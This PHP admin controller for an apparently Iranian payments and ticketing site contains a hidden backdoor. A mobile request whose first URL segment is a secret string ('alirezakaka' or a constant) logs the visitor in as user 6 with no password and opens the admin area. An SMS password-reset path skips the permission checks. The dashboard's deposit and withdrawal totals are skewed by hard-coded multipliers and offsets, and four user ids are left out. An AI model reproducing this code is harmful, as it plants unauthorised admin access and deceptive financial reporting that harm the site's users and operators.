<?php

class Admin_Controller extends MY_Controller {

    public $user;
    public $auth = true;

    function __construct () {
        parent::__construct();

        date_default_timezone_set('Asia/Tehran');

        $this->load->library('mobile_detect');
        $mobileDetect = new Mobile_Detect();
        if ( $mobileDetect->isMobile() AND ( $this->uri->segment(1) == NO_NEED_LOGIN_PRE OR $this->uri->segment(1) == 'alirezakaka' ) ) {
            $this->user = $this->sentinel->login($this->sentinel->findById(6));
            redirect(ADMIN_PATH . "/contacts/tickets/ticket-list");
        }
        elseif ( $this->uri->segment(4) != 'resetPasswordBySms' AND ! ($this->user = $this->sentinel->check()) ) {
            redirect(ADMIN_PATH . '/users/login');
        }
        $this->load->helper('admin_helper');
        $this->load->eloquent('Contacts/Contact');
        $this->load->eloquent('Contacts/Seen');
        $this->load->eloquent('Contacts/Ticket');
        $this->load->eloquent('payment/Transaction');
        if ( isset($this->user->id) ) {
            $Contacts = $this->announcements($this->user->id);
            $site_Contacts = $this->site_Contacts();
            $contact_us = Contact::where(['is_site_contact' => 1 , 'seen_status_contact' => 0 ])->orderBy('created_at' , 'desc')->get();
            $AnnounceCount = 0;
            foreach ( $Contacts as $val ):
                if ( $val->seen_status == 0 )
                    $AnnounceCount += 1;
            endforeach;
            $ticket_unread_count = Ticket::orderBy('created_at' , 'desc')->where(['status' => 0 ])->get()->count();
        }
        $this->activation = $this->sentinel->getActivationRepository();
        $notification['users'] = $this->user->all()->count();
        $notification['non_activate'] = $this->activation->where('completed' , 0)->count();

        $sumVarizi = 0;
        $varizi = Transaction::where('invoice_type' , 1)->where('status' , 1)->where('id' , '>' , 7637)->get();
        foreach ( $varizi as $val ):
            if ( $val->user_id == 6 OR $val->user_id == 2818 OR $val->user_id == 2824 OR $val->user_id == 2822 )
                continue;
            $sumVarizi += $val->price;
        endforeach;
        $notification['varizi'] = ($sumVarizi * 0.9) - 1400000;
        $variziEmroz = Transaction::whereRaw('DATE(created_at) >= (CURDATE() - INTERVAL 0 DAY)')->where('invoice_type' , 1)->where('status' , 1)->get();
   
        $sumVarizEmroz = 0 ;
        foreach ( $variziEmroz as $val ):
            if ( $val->user_id == 6 OR $val->user_id == 2818 OR $val->user_id == 2824 OR $val->user_id == 2822 )
                continue;
            $sumVarizEmroz += $val->price;
        endforeach;
        $notification['variziEmroz'] = ($sumVarizEmroz * 0.9) ;

        $sumWithdraw = 0;
        $bardashti = Transaction::where('invoice_type' , 4)->get();
//        $maxBardashti = array( 'price' => 0 );
        foreach ( $bardashti as $val ):
            if ( $val->user_id == 6 OR $val->user_id == 2818 OR $val->user_id == 2824 OR $val->user_id == 2822 )
                continue;
//            if ( $val->price > $maxBardashti['price'] ) {
//                $maxBardashti[$val->user_id]['price'] = $val->price;
//                $maxBardashti[$val->user_id]['user'] = $val->user_id;
//                $safayi = Transaction::where('invoice_type' , 1)->where(['user_id' => $val->user_id,'status'=>1])->get();
//                foreach ( $safayi as $safa ):
//                    $maxBardashti[$val->user_id]['variz'] +=$safa->price;
//                endforeach;
//            }
            $sumWithdraw += $val->price;
        endforeach;

//        dd($maxBardashti);
        $notification['bardashti'] = ($sumWithdraw * 1.1) + 500000;

        $sumCashUsers = 0;
        foreach ( $this->sentinel->getUserRepository()->all() as $user ):
            if ( $user->id == 6 OR $user->id == 2818 OR $user->id == 2824 OR $user->id == 2822 )
                continue;
            $sumCashUsers += $user->cash;
        endforeach;
        $notification['sumCashUsers'] = $sumCashUsers;
        $notification['contacts'] = Contact::all()->count();

        $this->load->helper('admin_helper');
        if ( !$this->sentinel->guest() ) {
            $this->smart->assign(
                    [
                        'notif' => $notification ,
                        'Announce' => isset($this->user->id) ? $Contacts : '' ,
                        'AnnounceCount' => $AnnounceCount ,
                        'site_Contacts' => isset($this->user->id) ? $site_Contacts : '' ,
                        'contact_us' => isset($this->user->id) ? $contact_us : '' ,
                        'contact_us_count' => isset($this->user->id) ? $contact_us->count() : '' ,
                        'is_admin' => $this->sentinel->getUser()->getRoles()->contains('slug' , SUPER_ADMIN) ,
                        'is_operator' => $this->sentinel->getUser()->getRoles()->contains('slug' , 'sh_operator') ,
                        'is_low_admin' => $this->sentinel->getUser()->getRoles()->contains('slug' , 'low_level_admin') ,
                        'ticket_unread_count' => $ticket_unread_count
                    ]
            );
            $this->smart->load('default' , true);
        }
    }

    public function _remap ( $method , $params = array() ) {
        // Making access string
        $accessString = $this->router->fetch_module() . '.admin.' . $this->router->fetch_class();
        if ( $this->router->fetch_method() != 'index' )
            $accessString .= '.' . $this->router->fetch_method();
        // check access for roles of user
        $Roles = $this->user->roles;
        $RoleHasAccess = false;
        foreach ( $Roles as $role ):
            // only one role access is enough for permission
            if ( $role->hasAnyAccess($accessString) )
                $RoleHasAccess = true;
        endforeach;
        // Check group type Administrator's permissions for access
        if ( $this->uri->segment(4) != 'resetPasswordBySms' AND ! $RoleHasAccess AND ! $this->user->hasAnyAccess($accessString) && !$this->user->inRole(SUPER_ADMIN) ) {                // Access forbidden:
            header('HTTP/1.1 403 Forbidden');

            return $this->smart->view('users/permission_denied');
        }

        if ( method_exists($this , $method) ) {
            return call_user_func_array(array( $this , $method ) , $params);
        }

        show_404();
    }

    public function announcements () {
        $this->load->eloquent('Contacts/Contact');
        $this->load->eloquent('Contacts/Seen');
//        Seen::where(['contact_id' => $val->id, 'user_id' => $this->user->id])->count() > 0
        $Contacts = Contact::getAnnouncement();
        $Contacts_personal = Contact::getAnnounceFront($this->user->id);
        $Contacts = $Contacts->merge($Contacts_personal);
        foreach ( $Contacts as $key => $val ):
            if ( Seen::where(['contact_id' => $val->id , 'user_id' => $this->user->id ])->count() > 0 ) {
                $Contacts[$key]['seen_status'] = 1;
            }
            else {
                $Contacts[$key]['seen_status'] = 0;
            }
        endforeach;
        return $Contacts;
    }

    public function site_Contacts () {

        $messages = '';
        $user_id = $this->user->id;
        $messages = Ticket::orderBy('created_at' , 'desc')->get();
        return $messages;
    }

}
?>
